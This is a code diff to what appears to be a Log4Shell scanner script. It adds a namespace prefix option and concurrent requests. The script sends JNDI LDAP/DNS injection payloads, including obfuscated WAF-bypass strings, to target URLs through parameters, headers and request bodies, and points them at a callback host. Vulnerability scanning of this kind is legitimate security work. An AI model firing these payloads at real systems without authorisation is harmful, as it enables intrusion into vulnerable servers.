@@ -11,6 +11,7 @@
 import argparse
 import random
 import requests
+import grequests
 import time
 import sys
 from urllib import parse as urlparse
@@ -59,6 +60,11 @@ waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{
                        "${jndi:dns://{{callback_host}}}"]
 
 parser = argparse.ArgumentParser()
+parser.add_argument("-prefix", "--prefix",
+                    dest="prefix",
+                    help="Prefix to append for seggregation.",
+                    action='store')
+
 parser.add_argument("-u", "--url",
                     dest="url",
                     help="Check a single URL.",
@@ -240,54 +246,73 @@ def parse_url(url):
 
 
 def scan_url(url, callback_host, customDns=False):
+
+
+    prefix = ""
+    if args.prefix:
+        prefix = args.prefix
+
+    timeout = 1
     parsed_url = parse_url(url)
     random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(7))
     payload = '${jndi:ldap://%s.%s/%s}' % (parsed_url["host"], callback_host, random_string)
     random_string = url
     if customDns == True:
-        payload = '${jndi:ldap://%s/%s}' % ( callback_host, random_string)
+        payload = '${jndi:ldap://%s/[[%s]]%s}' % ( callback_host, prefix, random_string)
+
+
+    cprint(f"[[Using namespace prefix ${prefix}]]")
+
 
 
     payloads = [payload]
+    _requests = []
     if args.waf_bypass_payloads:
         payloads.extend(generate_waf_bypass_payloads(f'{parsed_url["host"]}.{callback_host}', random_string))
     for payload in payloads:
         cprint(f"[•] URL: {url} | PAYLOAD: {payload}", "cyan")
         if args.request_type.upper() == "GET" or args.run_all_tests:
             try:
-                requests.request(url=url,
+                 _ = grequests.request(url=url,
                                  method="GET",
                                  params={"v": payload},
                                  headers=get_fuzzing_headers(payload),
                                  verify=False,
-                                 timeout=timeout)
+                                 timeout=timeout); _requests.append(_)
+
             except Exception as e:
                 cprint(f"EXCEPTION: {e}")
 
         if args.request_type.upper() == "POST" or args.run_all_tests:
             try:
                 # Post body
-                requests.request(url=url,
+                _ = grequests.request(url=url,
                                  method="POST",
                                  params={"v": payload},
                                  headers=get_fuzzing_headers(payload),
                                  data=get_fuzzing_post_data(payload),
                                  verify=False,
-                                 timeout=timeout)
+                                 timeout=timeout); _requests.append(_)
             except Exception as e:
                 cprint(f"EXCEPTION: {e}")
 
             try:
                 # JSON body
-                requests.request(url=url,
+                _ = grequests.request(url=url,
                                  method="POST",
                                  params={"v": payload},
                                  headers=get_fuzzing_headers(payload),
                                  json=get_fuzzing_post_data(payload),
                                  verify=False,
-                                 timeout=timeout)
+                                 timeout=timeout);  _requests.append(_)
             except Exception as e:
                 cprint(f"EXCEPTION: {e}")
+
+    responses = grequests.map(_requests, size=20)
+    for __ in responses:
+        print("__",  __)
+
+
 
 
 def main():
